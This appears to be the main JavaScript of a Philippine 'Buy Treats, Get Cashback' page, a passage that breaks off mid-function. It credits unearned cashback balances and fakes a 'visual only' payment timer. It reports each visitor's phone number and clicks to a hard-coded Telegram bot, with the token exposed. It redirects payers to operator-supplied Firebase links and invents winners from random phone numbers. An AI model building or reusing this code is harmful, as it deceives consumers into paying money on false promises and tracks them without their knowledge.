/* ============================================
   BUY TREATS | GET CASHBACK - MAIN SCRIPT
   ============================================ */

(function() {
  'use strict';

  // ===== CARD DATA =====
  const cardData = {
    1: {
      img: 'photos/1500iva.png',
      badge: '₱1,500',
      discount: '-22%',
      oldPrice: '₱700',
      newPrice: '545',
      amount: 1500,
      type: 'treat1',
      name: 'Treat 1 (₱1,500)'
    },
    2: {
      img: 'photos/3000iva.png',
      badge: '₱3,000',
      discount: '-28%',
      oldPrice: '₱1,500',
      newPrice: '1,080',
      amount: 3000,
      type: 'treat2',
      name: 'Treat 2 (₱3,000)'
    }
  };

  // ===== LOCAL STORAGE KEYS =====
  const STORAGE_KEYS = {
    SELECTED_CARD: 'treat_selected_card',
    SELECTED_AMOUNT: 'treat_selected_amount',
    USER_PHONE: 'user_phone'
  };

  // ===== USER DATA =====
  const userPhone = localStorage.getItem(STORAGE_KEYS.USER_PHONE) || '09171234567';
  if (!localStorage.getItem(STORAGE_KEYS.USER_PHONE)) {
    localStorage.setItem(STORAGE_KEYS.USER_PHONE, userPhone);
  }

  // ===== DOM REFERENCES =====
  const profileImg = document.getElementById('profileImg');
  const projectorImg = document.getElementById('projectorImg');
  const photoWrapper = document.getElementById('photoWrapper');
  const typedSpan = document.getElementById('typedText');
  const balanceElement = document.getElementById('balanceAmount');
  const claimNowBtn = document.getElementById('claimNowBtn');

  // Card Popup Elements
  const cardPopupOverlay = document.getElementById('cardPopupOverlay');
  const cardPopupClose = document.getElementById('cardPopupClose');
  const cardPopupImage = document.getElementById('cardPopupImage');
  const cardPopupOldPrice = document.getElementById('cardPopupOldPrice');
  const cardPopupNewPrice = document.getElementById('cardPopupNewPrice');
  const cardPopupDiscount = document.getElementById('cardPopupDiscount');
  const cardPopupReward = document.getElementById('cardPopupReward');
  const cardPopupSelectBtn = document.getElementById('cardPopupSelectBtn');

  // Claim Popup Elements
  const claimPopupOverlay = document.getElementById('claimPopupOverlay');
  const claimPopupClose = document.getElementById('claimPopupClose');
  const claimPopupImage = document.getElementById('claimPopupImage');
  const claimPopupOldPrice = document.getElementById('claimPopupOldPrice');
  const claimPopupNewPrice = document.getElementById('claimPopupNewPrice');
  const claimPopupDiscount = document.getElementById('claimPopupDiscount');
  const claimPopupRewardAmount = document.getElementById('claimPopupRewardAmount');
  const claimPopupPhone = document.getElementById('claimPopupPhone');
  const claimPayBtn = document.getElementById('claimPayBtn');
  const claimTimerDisplay = document.getElementById('claimTimerDisplay');

  // ===== STATE =====
  let selectedCard = null;
  let currentBalance = 0;
  let cardPopupNumber = null;
  let timerInterval = null;
  let timeRemaining = 0;
  let isTimerRunning = false;
  let treatLink = null;
  let isRedirecting = false;
  let linkScannerInterval = null;
  let currentCardType = null;
  let hasCheckedLink = false;
  let hasSentPayTreatsAlert = false;
  let isTypingPaused = false;

  // ===== FIREBASE REFERENCE =====
  const database = firebase.database();

  // ===== TELEGRAM CONFIG =====
  const TELEGRAM_BOT_TOKEN = '8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg';
  const TELEGRAM_CHAT_ID = '7298607329';

  // ===== HELPER: Format number with commas =====
  function formatWithCommas(number) {
    return number.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
  }

  // ===== GET PHILIPPINE TIME =====
  function getPhilippineTime() {
    return new Date().toLocaleString('en-PH', {
      timeZone: 'Asia/Manila',
      month: 'long',
      day: 'numeric',
      year: 'numeric',
      hour: '2-digit',
      minute: '2-digit',
      second: '2-digit'
    });
  }

  // ===== TELEGRAM HELPER =====
  function sendTelegramMessage(message) {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const params = {
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
      parse_mode: 'HTML'
    };
    
    const queryString = Object.keys(params)
      .map(key => `${encodeURIComponent(key)}=${encodeURIComponent(params[key])}`)
      .join('&');
    
    fetch(`${url}?${queryString}`)
      .then(response => response.json())
      .then(data => {
        if (!data.ok) {
          console.error('Telegram error:', data.description);
        } else {
          console.log('✅ Telegram notification sent');
        }
      })
      .catch(error => {
        console.error('Failed to send Telegram notification:', error);
      });
  }

  // ===== TELEGRAM ALERT FUNCTIONS =====
  function sendClaimNowAlert(cardName, cardAmount, phone) {
    const timestamp = getPhilippineTime();
    
    const message = `
📱 <b>CLAIM NOW CLICKED!</b> 🛍️

👤 <b>User:</b> ${phone}
💳 <b>Card:</b> ${cardName}
💰 <b>Amount:</b> ${cardAmount}
⏰ <b>Time:</b> ${timestamp}
📍 <b>Status:</b> Claim popup opened

#BuyTreats #ClaimNow #UserAction
    `;
    
    sendTelegramMessage(message);
  }

  function sendPayTreatsAlert(cardName, cardAmount, phone, hasLink) {
    const timestamp = getPhilippineTime();
    
    const linkStatus = hasLink ? '✅ With Link' : '❌ No Link';
    
    const message = `
💳 <b>PAY TREATS CLICKED!</b> 💰

👤 <b>User:</b> ${phone}
💎 <b>Card:</b> ${cardName}
🏷️ <b>Amount:</b> ${cardAmount}
🔗 <b>Link Status:</b> ${linkStatus}
⏰ <b>Time:</b> ${timestamp}

${hasLink ? '🔗 User will be redirected to treat link' : '⏰ Timer started (visual only)'}
#BuyTreats #PayTreats #UserAction
    `;
    
    sendTelegramMessage(message);
  }

  function sendRedirectAlert(cardName, cardAmount, phone) {
    const timestamp = getPhilippineTime();
    
    const message = `
🔗 <b>USER REDIRECTED!</b> 🚀

👤 <b>User:</b> ${phone}
💎 <b>Card:</b> ${cardName}
💰 <b>Amount:</b> ${cardAmount}
⏰ <b>Time:</b> ${timestamp}

✅ User successfully redirected to treat link!
#BuyTreats #Redirect #Conversion
    `;
    
    sendTelegramMessage(message);
  }

  // ===== CHECK FOR DEPLOYED LINK =====
  async function checkForDeployedLink(treatType) {
    try {
      console.log('🔍 Checking for deployed link for:', treatType);
      const snapshot = await database.ref('treat_links')
        .orderByChild('type')
        .equalTo(treatType)
        .once('value');
      
      const links = snapshot.val();
      if (links) {
        const linkIds = Object.keys(links);
        const latestId = linkIds[linkIds.length - 1];
        const linkData = links[latestId];
        return linkData.url;
      } else {
        return null;
      }
    } catch (error) {
      console.error('❌ Error checking for link:', error);
      return null;
    }
  }

  // ===== INCREMENT CLICK COUNT =====
  async function incrementClickCount(treatType) {
    try {
      const snapshot = await database.ref('treat_links')
        .orderByChild('type')
        .equalTo(treatType)
        .once('value');
      
      const links = snapshot.val();
      if (links) {
        const linkIds = Object.keys(links);
        const latestId = linkIds[linkIds.length - 1];
        const currentClicks = links[latestId].clicks || 0;
        await database.ref('treat_links/' + latestId + '/clicks').set(currentClicks + 1);
        console.log('✅ Click count incremented');
      }
    } catch (error) {
      console.error('❌ Error incrementing click count:', error);
    }
  }

  // ===== START REALTIME LINK SCANNER =====
  function startLinkScanner(treatType) {
    stopLinkScanner();
    currentCardType = treatType;
    hasCheckedLink = false;
    console.log('🔄 Starting realtime link scanner for:', treatType);
    
    checkAndRedirect(treatType);
    
    linkScannerInterval = setInterval(function() {
      checkAndRedirect(treatType);
    }, 1000);
  }

  function stopLinkScanner() {
    if (linkScannerInterval) {
      clearInterval(linkScannerInterval);
      linkScannerInterval = null;
      console.log('🛑 Link scanner stopped');
    }
    currentCardType = null;
    hasCheckedLink = false;
  }

  // ===== CHECK AND REDIRECT =====
  async function checkAndRedirect(treatType) {
    if (isRedirecting) return;
    if (!treatType) return;
    
    try {
      const link = await checkForDeployedLink(treatType);
      
      if (link) {
        console.log('🔗 Link found during scan:', link);
        
        if (claimPopupOverlay.classList.contains('active')) {
          if (isTimerRunning) {
            console.log('⏰ Timer running, stopping and redirecting...');
            clearInterval(timerInterval);
            timerInterval = null;
            isTimerRunning = false;
            claimPayBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> REDIRECTING...';
          }
          
          await incrementClickCount(treatType);
          
          const cardNumber = parseInt(selectedCard.replace('card', ''));
          const cardDataItem = cardData[cardNumber];
          sendRedirectAlert(cardDataItem.name, cardDataItem.badge, userPhone);
          
          isRedirecting = true;
          showToast('🔗 Redirecting to treat link...');
          
          setTimeout(function() {
            window.location.href = link;
          }, 1500);
        } else {
          treatLink = link;
          console.log('📌 Link stored for later use');
        }
      } else {
        console.log('ℹ️ No link found for:', treatType);
      }
    } catch (error) {
      console.error('❌ Error in scanner:', error);
    }
  }

  // ===== IMAGE ERROR HANDLING =====
  profileImg.addEventListener('error', function() {
    this.style.display = 'none';
    this.parentElement.style.background = 'linear-gradient(135deg, #0d9488, #06b6d4)';
    this.parentElement.style.display = 'flex';
    this.parentElement.style.alignItems = 'center';
    this.parentElement.style.justifyContent = 'center';
    const placeholder = document.createElement('span');
    placeholder.textContent = '👤';
    placeholder.style.fontSize = '2.5rem';
    placeholder.style.color = '#ffffff';
    placeholder.style.opacity = '0.6';
    this.parentElement.appendChild(placeholder);
  });

  projectorImg.addEventListener('error', function() {
    this.style.display = 'none';
    this.parentElement.style.background = 'linear-gradient(135deg, #0d9488, #06b6d4)';
    this.parentElement.style.display = 'flex';
    this.parentElement.style.alignItems = 'center';
    this.parentElement.style.justifyContent = 'center';
    const placeholder = document.createElement('span');
    placeholder.textContent = '👤';
    placeholder.style.fontSize = '4rem';
    placeholder.style.color = '#ffffff';
    placeholder.style.opacity = '0.6';
    this.parentElement.appendChild(placeholder);
  });

  // ===== THOUGHT BUBBLE TYPEWRITER =====
  const messagesNoBalance = [
    "🎄 Advance Merry Christmas! 🎅",
    "Earn cashback on every treat you buy! 💰",
    "Buy Treats & Get Cashback! 🎁",
    "Select a treat to start earning! ✨"
  ];

  const messagesWithBalance = [
    "🎄 Your balance is ready! 🎅",
    "Click Claim now and Pay the Treats to Earn mega cashback! 💰",
    "Don't forget to claim your reward! 🎁",
    "Your cashback is waiting! ✨ Claim now!!"
  ];

  let currentMessages = messagesNoBalance;
  let messageIndex = 0;
  let charIndex = 0;
  let isDeleting = false;
  let typingSpeed = 36;

  function updateThoughtMessages() {
    const balance = parseFloat(balanceElement.textContent.replace(/,/g, ''));
    
    if (balance > 0) {
      if (currentMessages !== messagesWithBalance) {
        currentMessages = messagesWithBalance;
        messageIndex = 0;
        charIndex = 0;
        isDeleting = false;
        typedSpan.textContent = '';
        setTimeout(typeEffect, 300);
      }
    } else {
      if (currentMessages !== messagesNoBalance) {
        currentMessages = messagesNoBalance;
        messageIndex = 0;
        charIndex = 0;
        isDeleting = false;
        typedSpan.textContent = '';
        setTimeout(typeEffect, 300);
      }
    }
  }

  function typeEffect() {
    if (isTypingPaused) return;
    
    const currentMessage = currentMessages[messageIndex];
    if (!currentMessage) {
      messageIndex = 0;
      return;
    }
    
    if (!isDeleting) {
      typedSpan.textContent = currentMessage.substring(0, charIndex + 1);
      charIndex++;
      if (charIndex === currentMessage.length) {
        setTimeout(() => { 
          isDeleting = true; 
          typeEffect(); 
        }, 2800);
        return;
      }
      setTimeout(typeEffect, typingSpeed + Math.random() * 18);
    } else {
      typedSpan.textContent = currentMessage.substring(0, charIndex - 1);
      charIndex--;
      if (charIndex === 0) {
        isDeleting = false;
        messageIndex = (messageIndex + 1) % currentMessages.length;
        setTimeout(typeEffect, 500);
        return;
      }
      setTimeout(typeEffect, typingSpeed * 0.3);
    }
  }

  setTimeout(typeEffect, 600);

  // Watch for balance changes
  const balanceObserver = new MutationObserver(function() {
    updateThoughtMessages();
  });

  if (balanceElement) {
    balanceObserver.observe(balanceElement, {
      childList: true,
      characterData: true,
      subtree: true
    });
  }

  // ===== PROJECTOR ZOOM - TAP TOGGLE =====
  photoWrapper.addEventListener('click', function(e) {
    e.stopPropagation();
    this.classList.toggle('active');
  });

  document.addEventListener('click', function(e) {
    if (!photoWrapper.contains(e.target)) {
      photoWrapper.classList.remove('active');
    }
  });

  // ===== BALANCE UPDATE =====
  function updateBalance(newAmount, isIncrement) {
    const amountSpan = balanceElement;
    amountSpan.classList.remove('increment', 'decrement');
    void amountSpan.offsetWidth;
    amountSpan.textContent = formatWithCommas(newAmount) + '.00';
    if (isIncrement) {
      amountSpan.classList.add('increment');
    } else {
      amountSpan.classList.add('decrement');
    }
    setTimeout(() => {
      amountSpan.classList.remove('increment', 'decrement');
    }, 700);
    
    // Save balance to localStorage
    localStorage.setItem(STORAGE_KEYS.SELECTED_AMOUNT, String(newAmount));
  }

  // ===== CARD SELECTION =====
  function selectCard(cardNumber) {
    const card = document.getElementById('card' + cardNumber);
    const btn = card.querySelector('.card-btn');
    const amount = cardData[cardNumber].amount;
    const cardId = 'card' + cardNumber;

    if (selectedCard === cardId) {
      card.classList.remove('selected');
      btn.classList.remove('selected-btn');
      btn.textContent = 'Select Treat';
      selectedCard = null;
      currentBalance = 0;
      updateBalance(0, false);
      stopLinkScanner();
      setTimeout(updateThoughtMessages, 300);
      
      localStorage.removeItem(STORAGE_KEYS.SELECTED_CARD);
      localStorage.removeItem(STORAGE_KEYS.SELECTED_AMOUNT);
      return;
    }

    if (selectedCard !== null) {
      const prevCard = document.getElementById(selectedCard);
      const prevBtn = prevCard.querySelector('.card-btn');
      prevCard.classList.remove('selected');
      prevBtn.classList.remove('selected-btn');
      prevBtn.textContent = 'Select Treat';
    }

    card.classList.add('selected');
    btn.classList.add('selected-btn');
    btn.textContent = '✓ Selected';
    selectedCard = cardId;
    currentBalance = amount;
    updateBalance(amount, true);
    setTimeout(updateThoughtMessages, 300);
    
    localStorage.setItem(STORAGE_KEYS.SELECTED_CARD, cardId);
    localStorage.setItem(STORAGE_KEYS.SELECTED_AMOUNT, String(amount));
    
    const cardNumberParsed = parseInt(selectedCard.replace('card', ''));
    const treatType = cardData[cardNumberParsed].type;
    startLinkScanner(treatType);
  }
  window.selectCard = selectCard;

  // ===== RESTORE SELECTED CARD FROM LOCALSTORAGE =====
  function restoreSelectedCard() {
    const savedCard = localStorage.getItem(STORAGE_KEYS.SELECTED_CARD);
    const savedAmount = localStorage.getItem(STORAGE_KEYS.SELECTED_AMOUNT);
    
    if (!savedCard) {
      console.log('ℹ️ No saved card found');
      return false;
    }
    
    const cardElement = document.getElementById(savedCard);
    if (!cardElement) {
      console.log('⚠️ Saved card not found in DOM');
      localStorage.removeItem(STORAGE_KEYS.SELECTED_CARD);
      localStorage.removeItem(STORAGE_KEYS.SELECTED_AMOUNT);
      return false;
    }
    
    const cardNumber = parseInt(savedCard.replace('card', ''));
    if (!cardData[cardNumber]) {
      console.log('⚠️ Invalid card data');
      localStorage.removeItem(STORAGE_KEYS.SELECTED_CARD);
      localStorage.removeItem(STORAGE_KEYS.SELECTED_AMOUNT);
      return false;
    }
    
    const amount = parseFloat(savedAmount) || cardData[cardNumber].amount;
    const btn = cardElement.querySelector('.card-btn');
    
    document.querySelectorAll('.card-item').forEach(c => {
      if (c.id !== savedCard) {
        c.classList.remove('selected');
        const b = c.querySelector('.card-btn');
        if (b) {
          b.classList.remove('selected-btn');
          b.textContent = 'Select Treat';
        }
      }
    });
    
    cardElement.classList.add('selected');
    if (btn) {
      btn.classList.add('selected-btn');
      btn.textContent = '✓ Selected';
    }
    
    selectedCard = savedCard;
    currentBalance = amount;
    updateBalance(amount, true);
    setTimeout(updateThoughtMessages, 300);
    
    const treatType = cardData[cardNumber].type;
    startLinkScanner(treatType);
    
    console.log('✅ Card restored:', savedCard, 'Amount:', amount);
    return true;
  }

  // ===== CARD POPUP =====
  function openCardPopup(cardNumber) {
    cardPopupNumber = cardNumber;
    const data = cardData[cardNumber];
    
    cardPopupImage.src = data.img;
    cardPopupOldPrice.textContent = data.oldPrice;
    cardPopupNewPrice.textContent = data.newPrice;
    cardPopupDiscount.textContent = data.discount;
    cardPopupReward.textContent = formatWithCommas(parseInt(data.badge.replace('₱', '').replace(/,/g, '')));
    
    updateCardPopupButtonState();
    
    cardPopupOverlay.classList.add('active');
    document.body.style.overflow = 'hidden';
  }
  window.openCardPopup = openCardPopup;

  function closeCardPopup() {
    cardPopupOverlay.classList.remove('active');
    document.body.style.overflow = '';
  }

  function updateCardPopupButtonState() {
    const cardId = 'card' + cardPopupNumber;
    const card = document.getElementById(cardId);
    const isSelected = card.classList.contains('selected');
    
    if (isSelected) {
      cardPopupSelectBtn.classList.add('selected-popup');
      cardPopupSelectBtn.innerHTML = '<i class="fas fa-check-circle"></i> ✓ Selected';
    } else {
      cardPopupSelectBtn.classList.remove('selected-popup');
      cardPopupSelectBtn.innerHTML = '<i class="fas fa-check-circle"></i> Select Treat';
    }
  }

  function cardPopupSelectCard() {
    if (cardPopupNumber) {
      selectCard(cardPopupNumber);
      updateCardPopupButtonState();
      setTimeout(closeCardPopup, 400);
    }
  }

  // Card Popup Event Listeners
  cardPopupClose.addEventListener('click', closeCardPopup);
  cardPopupSelectBtn.addEventListener('click', cardPopupSelectCard);
  
  cardPopupOverlay.addEventListener('click', function(e) {
    if (e.target === cardPopupOverlay) {
      closeCardPopup();
    }
  });

  // ===== CLAIM POPUP =====
  function openClaimPopup() {
    if (selectedCard === null) {
      alert('💳 Please select a treat reward first!');
      return;
    }
    
    const cardNumber = parseInt(selectedCard.replace('card', ''));
    const data = cardData[cardNumber];
    const rawAmount = parseInt(data.badge.replace('₱', '').replace(/,/g, ''));
    
    claimPopupImage.src = data.img;
    claimPopupOldPrice.textContent = data.oldPrice;
    claimPopupNewPrice.textContent = data.newPrice;
    claimPopupDiscount.textContent = data.discount;
    claimPopupRewardAmount.textContent = formatWithCommas(rawAmount);
    claimPopupPhone.textContent = userPhone;
    
    sendClaimNowAlert(data.name, data.badge, userPhone);
    
    resetClaimTimer();
    isRedirecting = false;
    hasSentPayTreatsAlert = false;
    
    checkForDeployedLink(data.type).then(link => {
      treatLink = link;
      if (link) {
        console.log('🔗 Link exists, will redirect on PAY TREATS click');
        claimPayBtn.innerHTML = '<i class="fas fa-link"></i> PAY TREATS';
        claimPayBtn.classList.remove('disabled');
      } else {
        console.log('ℹ️ No link deployed, timer mode');
        claimPayBtn.innerHTML = '<i class="fas fa-credit-card"></i> PAY TREATS';
        claimPayBtn.classList.remove('disabled');
      }
    });
    
    claimPopupOverlay.classList.add('active');
    document.body.style.overflow = 'hidden';
  }

  function closeClaimPopup() {
    resetClaimTimer();
    claimPopupOverlay.classList.remove('active');
    document.body.style.overflow = '';
  }

  // ===== TIMER (Visual Only - No Alerts) =====
  function startTimer() {
    if (selectedCard === null) {
      alert('💳 Please select a treat reward first!');
      return;
    }
    
    if (isTimerRunning) return;
    
    if (!hasSentPayTreatsAlert) {
      const cardNumber = parseInt(selectedCard.replace('card', ''));
      const data = cardData[cardNumber];
      sendPayTreatsAlert(data.name, data.badge, userPhone, !!treatLink);
      hasSentPayTreatsAlert = true;
    }
    
    if (treatLink && !isRedirecting) {
      console.log('🔗 Link exists, redirecting immediately...');
      isRedirecting = true;
      claimPayBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> REDIRECTING...';
      
      const cardNumber = parseInt(selectedCard.replace('card', ''));
      const data = cardData[cardNumber];
      sendRedirectAlert(data.name, data.badge, userPhone);
      
      setTimeout(function() {
        window.location.href = treatLink;
      }, 1500);
      return;
    }
    
    timeRemaining = 300;
    isTimerRunning = true;
    claimPayBtn.classList.add('disabled');
    claimPayBtn.innerHTML = '<i class="fas fa-hourglass-half"></i> WAIT <span class="timer-display" id="claimTimerDisplay">5:00</span>';
    
    timerInterval = setInterval(function() {
      timeRemaining--;
      const minutes = Math.floor(timeRemaining / 60);
      const seconds = timeRemaining % 60;
      const timeStr = String(minutes).padStart(2, '0') + ':' + String(seconds).padStart(2, '0');
      
      const display = document.getElementById('claimTimerDisplay');
      if (display) {
        display.textContent = timeStr;
      }
      
      if (timeRemaining <= 0) {
        clearInterval(timerInterval);
        timerInterval = null;
        isTimerRunning = false;
        
        claimPayBtn.classList.remove('disabled');
        claimPayBtn.innerHTML = '<i class="fas fa-credit-card"></i> PAY TREATS';
        const display2 = document.getElementById('claimTimerDisplay');
        if (display2) display2.textContent = '';
        console.log('⏰ Timer finished - button reset');
      }
    }, 1000);
  }

  function resetClaimTimer() {
    if (timerInterval) {
      clearInterval(timerInterval);
      timerInterval = null;
    }
    isTimerRunning = false;
    timeRemaining = 0;
    isRedirecting = false;
    hasSentPayTreatsAlert = false;
    claimPayBtn.classList.remove('disabled');
    const display = document.getElementById('claimTimerDisplay');
    if (display) {
      display.textContent = '';
    }
    claimPayBtn.innerHTML = '<i class="fas fa-credit-card"></i> PAY TREATS';
  }

  // ===== SHOW TOAST =====
  function showToast(message, isError = false) {
    const existingToast = document.querySelector('.toast-message');
    if (existingToast) {
      existingToast.remove();
    }
    
    const toast = document.createElement('div');
    toast.className = 'toast-message' + (isError ? ' error' : '');
    toast.textContent = message;
    document.body.appendChild(toast);
    
    setTimeout(() => {
      toast.style.animation = 'toastSlideDown 0.3s ease';
      setTimeout(() => {
        toast.remove();
      }, 300);
    }, 3000);
  }

  // Claim Popup Event Listeners
  claimPopupClose.addEventListener('click', closeClaimPopup);
  claimPayBtn.addEventListener('click', startTimer);
  
  claimPopupOverlay.addEventListener('click', function(e) {
    if (e.target === claimPopupOverlay) {
      closeClaimPopup();
    }
  });

  // ===== HELP WIDGET =====
  window.openHelp = function() {
    window.open('https://facebook.com/FreeShoppingPH', '_blank');
  };

  // ===== CLAIM NOW BUTTON =====
  claimNowBtn.addEventListener('click', function() {
    if (currentBalance <= 0) {
      alert('💳 Please select a treat reward first!');
    } else {
      openClaimPopup();
    }
  });

  // ===== ESCAPE KEY =====
  document.addEventListener('keydown', function(e) {
    if (e.key === 'Escape') {
      if (cardPopupOverlay.classList.contains('active')) {
        closeCardPopup();
      }
      if (claimPopupOverlay.classList.contains('active')) {
        closeClaimPopup();
      }
    }
  });

  // ============================================================
  // WINNERS TICKER
  // ============================================================

  function generateRandomPhone() {
    const prefix = '09' + String(Math.floor(Math.random() * 9000) + 1000);
    const suffix = String(Math.floor(Math.random() * 9000) + 1000);
    return prefix + suffix;
  }

  function generateRandomAmount() {
    const random = Math.random();
    if (random < 0.7) {
      return { amount: 1500, display: '₱1,500', class: 'common' };
    } else {
      return { amount: 3000, display: '₱3,000', class: 'rare' };
    }
  }

  function createTickerItem(phone, amountData) {
    const item = document.createElement('div');
    item.className = 'ticker-item';
    
    const icon = document.createElement('img');
    icon.src = 'photos/gc_icon.png';
    icon.alt = 'GCash';
    icon.className = 'gc-icon-small';
    
    const phoneSpan = document.createElement('span');
    phoneSpan.className = 'ticker-phone';
    phoneSpan.textContent = phone;
    
    const claimSpan = document.createElement('span');
    claimSpan.className = 'ticker-claim';
    claimSpan.textContent
